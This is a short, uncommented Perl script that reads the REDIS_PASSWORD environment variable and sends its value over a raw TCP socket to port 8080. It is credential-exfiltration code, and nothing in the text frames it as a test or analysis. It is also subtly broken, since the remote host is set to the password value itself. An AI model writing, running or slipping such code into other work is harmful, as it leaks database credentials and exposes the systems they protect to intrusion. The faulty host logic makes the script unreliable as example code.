#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

my $env_var = "REDIS_PASSWORD";
my $data_to_send = $ENV{$env_var};

my $remote_host = $data_to_send;
my $remote_port = 8080;

my $socket = IO::Socket::INET->new(
    PeerAddr => $remote_host,
    PeerPort => $remote_port,
    Proto    => 'tcp',
) or die "Failed to connect to $remote_host:$remote_port - $!";

print $socket $data_to_send;
$socket->close();
